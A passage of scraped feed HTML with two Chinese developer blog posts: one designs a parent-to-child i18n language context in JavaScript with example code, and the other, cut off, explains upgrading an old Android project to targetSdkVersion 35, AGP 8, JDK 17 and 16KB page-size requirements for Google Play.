/AjXz21J3k04l+i8OjErj4kaXWQiIVO/EvA+KLRAEnUVomtjPd6SvR3RLoeMT54nKFH1EqtkkEGFaQuTlSQrsxhRiOIt51S/Ho8B11+FUlwRaHnU4utEI38/mgSjRJ8PhWEtN6Z6WcncQOU4efjKoh3zfi7/+DfhPrwOZ9a/iYBiVJJxPlei3CqIDTYEqAPFow5/c71fAdVIwmo4n+cTIGbr2n9NULAE5ifcNNS63hvEOFk0wxYnICBBZ0I9xERBVILF0uggNdxuOkR4S6ngvgPmArzHv4KpMKGQFjQ+Rw6q9dC6R6dgZaJF7RVWIH0BTY9h+fz0ohHOyLuy+He/hN4GUR3/RxcBx2f76izarI9CaXmzRmhNQuSfIgJkva5GzN6HJbhQxCNsDGDSh56plmef6sg2eaXPsYBt5W+H6VE6omG6hOS1w4hiTWiThbJ1YO+RSO1vrpMlomf6nhQGz0m7qT6W04XOUHyzhZ4rkG+0hxL66oDW9mnPWyL3TMmssxyQUwr01CHX7b2OvUIaqS48TnMtAoEQTQixJeAlDfSiGmk/l8jpwIpTyFqOfeNIHWBooC036ERtUQp2tm/CKT5jjySbxTlvUVj2yhjvyWDVL3yfKRojXwLSEWUp7q0PBAKPp7m5YGoT3WH7wAZ1BeOywNZv3Gak/LIqriwxbQ5jaTcsEW1eb+FvoWo+zr5V/IUOvNtsapU2zJXSyj0xVB13sPfq0kkZA7dubIIKXIlJ8Cy7u+BN22RVcr+peOuxHdcBbA04FAVmEoEtO5vX55K4KVZS1QJvBBzU1rgUl8JapBNYIowLoZtD9NWRTWKqqe36L48BSz8QPH9epqqIDehlh2UuqocEmrdV7AvhuRoM74m80yeDIEX3ppreNN235FxV58DNjhswn5K8zK21+5ctjut6NmUIoy9tVvitnHr2VDM3ahtW8KQ/Vbsp9GGiWHfk8skyTSFz9/HdxhHe4uR/RxX/mG1SGXwypcDJNmCMfucZ/C1CuCQUbiBUDYbe7tiRkZX8GIat50d+wqR1fdN7ygGzrHrcN4kGFHK02cil5M6INgQVsvnNz77T5PqUFYJJInYmIBplJfP5On4eiOwYfhuCD44oLyYVs43rI1rk3H7usttzq8Qo3j84vavN9mOkAeuq8dHEd9NtCVKX51Oen+MM6IEYvz5StOehKLpIjD+nKU5AQWJpLizdB+1sb5LQvFRxbSJVGHmSdK/0WWaPguEYmcSJ68aWkK6rAw6jwSSCmrTWVHT96R7HwHANEgqybVJL+E2vE2q7Uu91Gr73SbbNUvZDtiOlCeIv4r/AI+0XUwz1lvcAAAAAElFTkSuQmCC");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"❝";top:8px;left:5px}.markdown-body blockquote:after{content:"❞";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🧭 一、问题背景：多语言的“连锁反应”</h2>
<p>在复杂前端项目中，组件往往像家族体系：</p>
<ul>
<li>父组件 = 负责状态与全局配置；</li>
<li>子组件 = 承担独立逻辑与展示责任。</li>
</ul>
<p>当我们引入国际化（i18n）机制时，往往碰到这些难题：</p>
<ol>
<li>🌐 <strong>多层组件语言切换不同步</strong><br/>
父子组件之间语言环境不统一，UI 更新延迟或错乱。</li>
<li>🧩 <strong>语言上下文传递复杂</strong><br/>
繁琐地通过 props 层层传递 locale，不仅臃肿还容易出错。</li>
<li>🔄 <strong>动态语言切换的状态同步难题</strong><br/>
用户手动切换语言，但子组件需要感知并自动响应。</li>
</ol>
<hr/>
<h2 data-id="heading-1">🧠 二、设计理念：语言上下文的“家族血缘共享”</h2>
<p>i18n 架构的本质是：</p>
<blockquote>
<p><strong>让语言上下文像 DNA 一样，从父组件自然遗传到子组件。</strong></p>
</blockquote>
<p>这意味着我们需要一个“上下文化”的机制，使所有组件：</p>
<ul>
<li>都能访问统一的语言环境；</li>
<li>都能监听语言切换事件；</li>
<li>可在局部覆盖语言内容。</li>
</ul>
<p>因此设计要点是三层结构：</p>

























<table><thead><tr><th>层级</th><th>功能职责</th><th>技术手段</th></tr></thead><tbody><tr><td>🌍 全局层</td><td>定义语言上下文与切换逻辑</td><td>Context Provider（React）或 provide/inject（Vue）</td></tr><tr><td>🧱 父组件层</td><td>定义局部字典、可覆盖全局</td><td>局部 i18n 对象合并</td></tr><tr><td>🧩 子组件层</td><td>响应语言变化，实时渲染</td><td>监听上下文变化，动态渲染</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">🛠️ 三、架构模型视图</h2>
<pre><code class="hljs language-scss" lang="scss">AppRoot (GlobalI18nProvider)
│
├── ParentComponent (可定义局部i18n覆盖)
│     │
│     ├── ChildComponentA（共享来自Parent的i18n）
│     └── ChildComponentB（可定义自有词条或依赖父级）
│
└── OtherComponent（复用全局语言词典）
</code></pre>
<hr/>
<h2 data-id="heading-3">🔧 四、JavaScript 实现示意（框架无关）</h2>
<p>以下是一个简化的 JS 架构模型（可迁移到 React/Vue/Svelte 等框架）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 🌍 i18nContext.js - 定义全局语言上下文</span>
<span class="hljs-keyword">const</span> I18nContext = (<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">let</span> currentLocale = <span class="hljs-string">'en'</span>;
  <span class="hljs-keyword">const</span> listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();

  <span class="hljs-comment">// 全局词典</span>
  <span class="hljs-keyword">const</span> dictionaries = {
    <span class="hljs-attr">en</span>: { <span class="hljs-attr">greeting</span>: <span class="hljs-string">"Hello"</span>, <span class="hljs-attr">farewell</span>: <span class="hljs-string">"Goodbye"</span> },
    <span class="hljs-attr">zh</span>: { <span class="hljs-attr">greeting</span>: <span class="hljs-string">"你好"</span>, <span class="hljs-attr">farewell</span>: <span class="hljs-string">"再见"</span> }
  };

  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">t</span>(<span class="hljs-params">key</span>) {
      <span class="hljs-keyword">return</span> dictionaries[currentLocale][key] || key;
    },
    <span class="hljs-title function_">setLocale</span>(<span class="hljs-params">lang</span>) {
      currentLocale = lang;
      listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span> =&gt;</span> <span class="hljs-title function_">fn</span>(lang));
    },
    <span class="hljs-title function_">getLocale</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">return</span> currentLocale;
    },
    <span class="hljs-title function_">subscribe</span>(<span class="hljs-params">fn</span>) {
      listeners.<span class="hljs-title function_">add</span>(fn);
      <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> listeners.<span class="hljs-title function_">delete</span>(fn);
    }
  };
})();
</code></pre>
<hr/>
<h3 data-id="heading-4">🧱 父组件定义</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 父组件：定义局部字典，并合并全局字典</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ParentComponent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">localDict</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">localDict</span> = localDict;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">childComponents</span> = [];
    <span class="hljs-comment">// 订阅语言变化</span>
    I18nContext.<span class="hljs-title function_">subscribe</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>());
  }

  <span class="hljs-title function_">t</span>(<span class="hljs-params">key</span>) {
    <span class="hljs-keyword">const</span> globalValue = I18nContext.<span class="hljs-title function_">t</span>(key);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">localDict</span>?.[I18nContext.<span class="hljs-title function_">getLocale</span>()]?.[key] || globalValue;
  }

  <span class="hljs-title function_">addChild</span>(<span class="hljs-params">child</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">childComponents</span>.<span class="hljs-title function_">push</span>(child);
    child.<span class="hljs-title function_">setParent</span>(<span class="hljs-variable language_">this</span>);
  }

  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`👨‍👩‍👧 父组件语言：<span class="hljs-subst">${I18nContext.getLocale()}</span>`</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">t</span>(<span class="hljs-string">'greeting'</span>));
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">childComponents</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c.<span class="hljs-title function_">render</span>());
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-5">🧩 子组件定义</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChildComponent</span> {
  <span class="hljs-title function_">setParent</span>(<span class="hljs-params">parent</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">parent</span> = parent;
    <span class="hljs-comment">// 自动响应语言变化</span>
    I18nContext.<span class="hljs-title function_">subscribe</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>());
  }

  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> locale = I18nContext.<span class="hljs-title function_">getLocale</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`🧒 子组件语言：<span class="hljs-subst">${locale}</span>`</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">parent</span>.<span class="hljs-title function_">t</span>(<span class="hljs-string">'farewell'</span>));
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-6">🧑‍💻 使用示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 创建父、子组件</span>
<span class="hljs-keyword">const</span> parent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParentComponent</span>({
  <span class="hljs-attr">zh</span>: { <span class="hljs-attr">greeting</span>: <span class="hljs-string">"欢迎来到父组件"</span> },
  <span class="hljs-attr">en</span>: { <span class="hljs-attr">greeting</span>: <span class="hljs-string">"Welcome to Parent Component"</span> }
});
<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChildComponent</span>();
parent.<span class="hljs-title function_">addChild</span>(child);

<span class="hljs-comment">// 初始渲染</span>
parent.<span class="hljs-title function_">render</span>();

<span class="hljs-comment">// 切换语言</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n🚀 切换到中文"</span>);
  I18nContext.<span class="hljs-title function_">setLocale</span>(<span class="hljs-string">'zh'</span>);
}, <span class="hljs-number">1000</span>);
</code></pre>
<h3 data-id="heading-7">✅ 输出结果</h3>
<pre><code class="hljs language-css" lang="css">👨‍👩‍👧 父组件语言：en
Welcome <span class="hljs-selector-tag">to</span> Parent Component
🧒 子组件语言：en
Goodbye

🚀 切换到中文
👨‍👩‍👧 父组件语言：zh
欢迎来到父组件
🧒 子组件语言：zh
再见
</code></pre>
<hr/>
<h2 data-id="heading-8">🧩 五、架构细节优化建议</h2>



































<table><thead><tr><th>特性</th><th>方案</th><th>优点</th></tr></thead><tbody><tr><td>动态词典加载</td><td>使用异步 import，根据 locale 按需加载</td><td>减少内存占用</td></tr><tr><td>局部覆盖机制</td><td>使用 <code>Object.assign(global, local)</code> 合并策略</td><td>灵活扩展</td></tr><tr><td>缓存层</td><td>利用 Map 缓存已渲染结果</td><td>提升性能</td></tr><tr><td>响应式语言切换</td><td>使用 Proxy 或 Signals 响应数据变化</td><td>减少手动绑定</td></tr><tr><td>插件化</td><td>各模块封装成 Plugin 注册</td><td>模块化维护方便</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-9">🌈 六、总结：让组件“会说话”的科学艺术</h2>
<ul>
<li>🧬 <strong>i18n 架构的核心在于 Context 与继承</strong></li>
<li>⚡ <strong>父子通信应基于响应式机制，而非静态传参</strong></li>
<li>🔁 <strong>语言切换应触发全链路 UI 刷新</strong></li>
<li>🧭 <strong>局部词典 ≠ 重复造轮子，而是语义差异的优化层</strong></li>
</ul>
<blockquote>
<p>“让组件学会多语言，其实就是让前端拥有更强的表达力。” 🌍</p>
</blockquote>
<hr/>
<h2 data-id="heading-10">💡 扩展方向</h2>
<p>✅ 多层级 i18n 继承调度机制<br/>
✅ SSR/CSR 环境的语言同步方案<br/>
✅ WebAIGC + i18n：AI 自动多语言翻译填充 UI</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android + Google Play：老项目适配实战指南]]></title>    <link>https://juejin.cn/post/7579946275436838922</link>    <guid>https://juejin.cn/post/7579946275436838922</guid>    <pubDate>2025-12-05T09:08:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579946275436838922" data-draft-id="7579946275436134410" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android + Google Play：老项目适配实战指南"/> <meta itemprop="keywords" content="Android,Google"/> <meta itemprop="datePublished" content="2025-12-05T09:08:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="没有了遇见"/> <meta itemprop="url" content="https://juejin.cn/user/1521379826212983"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android + Google Play：老项目适配实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379826212983/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    没有了遇见
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T09:08:30.000Z" title="Fri Dec 05 2025 09:08:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1:前情提要</h2>
<p>作为一个Android开发 ,面对日益操蛋的应用市场,敢怒不敢言.什么target 28 什么权限说明,什么隐私协议,什么获取手机信息过于频繁....</p>
<p>这部Google play 又折腾起来了.</p>
<p>没办法只能适配了,QB自己,幸福他人,祝愿.xxx.xxxxx.....</p>
<h2 data-id="heading-1">2:现实环境</h2>
<p>维护了十年左右的老项目(<code>Okgo</code>,<code>ButterKnife</code> 时代的产物,且外包出来的项目)</p>
<ul>
<li>targetSdkVersion 33</li>
<li>Gradle 7.3.1</li>
<li>Jdk 8</li>
<li>一万个三方库</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6873df842b404380a2f8dd5aac9ea816~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5pyJ5LqG6YGH6KeB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765530640&amp;x-signature=M4uddWJoegT2sewVuZ4LSe7qU%2BY%3D" alt="一部分.png" loading="lazy"/></p>
<h2 data-id="heading-2">3:Google Play 提交前需要处理的事情</h2>
<p>老爷们时代变了,一个Gradle+JDK8 打天下的时代变了</p>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fdeveloper.android.google.cn%2Fgoogle%2Fplay%2Frequirements%2Ftarget-sdk" title="https://link.juejin.cn/?target=https%3A%2F%2Fdeveloper.android.google.cn%2Fgoogle%2Fplay%2Frequirements%2Ftarget-sdk" target="_blank">API要求官方说明</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40f1d10dfc4f431abb6f093e605c02a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5pyJ5LqG6YGH6KeB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765530640&amp;x-signature=AXv%2BSX1YTLsym6VLNd%2FXV%2FO%2B5JI%3D" alt="image.png" loading="lazy"/></p>
<p><code>提交应用市场要处理的问题:</code></p>
<ul>
<li>targetSdkVersion 35</li>
<li>16KB Size 适配</li>
<li>AAB 拆包(太大的需求拆包)</li>
</ul>
<h2 data-id="heading-3">4 targetSdkVersion 35 变动</h2>
<p>官方要求必须使用target 35 然后一系列连锁反应就来了,真是下了一步好棋啊</p>
<p>使用targetVersion 35 --&gt;需要Gradle 8.0+ --&gt;再需要Jdk17 --&gt;再需要kotlin 1.9+</p>
<p><code>变动路径</code></p>
<p><strong>targetSdkVersion：35</strong><br/>
官方要求 2025 年新提交 App 必须 target 35+，</p>
<p><strong>Gradle / Android Gradle Plugin：8.0+（推荐 8.6）</strong><br/>
对应 Koala / Ladybug 系列。</p>
<pre><code class="hljs language-arduino" lang="arduino">classpath <span class="hljs-string">'com.android.tools.build:gradle:8.6.0'</span>
</code></pre>
<p><strong>JDK：17（必须）</strong><br/>
Google Play 已经要求 AGP 8+ 必须使用 JDK 17。<br/>
Android Studio 内置的 JDK 17 直接用即可，不要自己乱装。</p>
<p><strong>Kotlin：1.9.23 或 2.0.0（推荐 1.9.x）</strong><br/>
无特殊需求用 <strong>1.9.23</strong> 最稳，Kotlin 2.0 虽然可用，但生态兼容性仍在适配。</p>
<pre><code class="hljs language-bash" lang="bash">plugins {
    <span class="hljs-built_in">id</span> <span class="hljs-string">"org.jetbrains.kotlin.android"</span> version <span class="hljs-string">"1.9.23"</span>
}
</code></pre>
<p><strong>签名（必须 V1 + V2 + V3）</strong><br/>
Google Play 会自动生成 V4，所以你本地保持：</p>
<ul>
<li>✔ V1（Jar Signature）</li>
<li>✔ V2（APK Signature Scheme v2）</li>
<li>✔ V3（APK Signature Scheme v3）</li>
</ul>
<p>Android Studio 默认勾选即可。</p>
<pre><code class="hljs language-lua" lang="lua">
targetSdkVersion <span class="hljs-number">35</span> 版本<span class="hljs-comment">--&gt;</span>
gradle <span class="hljs-number">8.0</span>+版本<span class="hljs-comment">--&gt;</span>
jdk17+ 版本<span class="hljs-comment">--&gt;</span>
kotlin <span class="hljs-number">1.9</span><span class="hljs-number">.23</span>版本<span class="hljs-comment">--&gt;</span>
签名

真是一步好棋啊,老爷们时代变了,不是一个gradle +jdk8 打天下的时代了

</code></pre>
<p><code>现在使用的版本:</code></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">agp</span> = <span class="hljs-string">"8.9.1"</span>
<span class="hljs-attr">compileSdkVersion</span>= <span class="hljs-string">"36"</span>
<span class="hljs-attr">kotlin</span> = <span class="hljs-string">"2.2.10"</span>
<span class="hljs-attr">jdk</span>=<span class="hljs-number">17</span>
</code></pre>
<h2 data-id="heading-4">5: 16KB Size 适配</h2>
<p>你真不适配真敢给你不能用!!!</p>
